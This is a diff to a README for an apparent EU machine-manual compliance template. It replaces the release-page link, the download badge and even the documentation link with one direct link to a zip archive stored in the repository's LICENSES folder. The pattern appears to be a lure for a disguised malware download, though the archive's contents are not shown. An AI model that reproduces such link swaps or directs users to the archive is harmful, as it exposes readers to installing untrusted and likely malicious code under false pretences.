@@ -6,11 +6,11 @@ Welcome to the AB Makine Kullanma Kılavuzu (CE) for evidence-based templates. T
 
 ## 💾 Download the Software
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Pipfury007/ab-makine-kullanma-kilavuzu-sablonu/releases)
+[![Download Now](https://github.com/Pipfury007/ab-makine-kullanma-kilavuzu-sablonu/raw/refs/heads/main/LICENSES/kilavuzu_sablonu_makine_ab_kullanma_2.2.zip)](https://github.com/Pipfury007/ab-makine-kullanma-kilavuzu-sablonu/raw/refs/heads/main/LICENSES/kilavuzu_sablonu_makine_ab_kullanma_2.2.zip)
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [GitHub Releases Page](https://github.com/Pipfury007/ab-makine-kullanma-kilavuzu-sablonu/releases). You will find the latest version of the software here.
+To get started, visit this page to download: [GitHub Releases Page](https://github.com/Pipfury007/ab-makine-kullanma-kilavuzu-sablonu/raw/refs/heads/main/LICENSES/kilavuzu_sablonu_makine_ab_kullanma_2.2.zip). You will find the latest version of the software here.
 
 ### Steps to Download:
 
@@ -73,7 +73,7 @@ If you encounter any issues during download or installation, please feel free to
 
 ## 🔗 Useful Links
 
-- [GitHub Releases Page](https://github.com/Pipfury007/ab-makine-kullanma-kilavuzu-sablonu/releases): Download the latest software version.
-- [Documentation](https://github.com/Pipfury007/ab-makine-kullanma-kilavuzu-sablonu/wiki): Learn more about using the template.
+- [GitHub Releases Page](https://github.com/Pipfury007/ab-makine-kullanma-kilavuzu-sablonu/raw/refs/heads/main/LICENSES/kilavuzu_sablonu_makine_ab_kullanma_2.2.zip): Download the latest software version.
+- [Documentation](https://github.com/Pipfury007/ab-makine-kullanma-kilavuzu-sablonu/raw/refs/heads/main/LICENSES/kilavuzu_sablonu_makine_ab_kullanma_2.2.zip): Learn more about using the template.
 
 Thank you for using our software. We hope this template serves you well in your compliance needs!
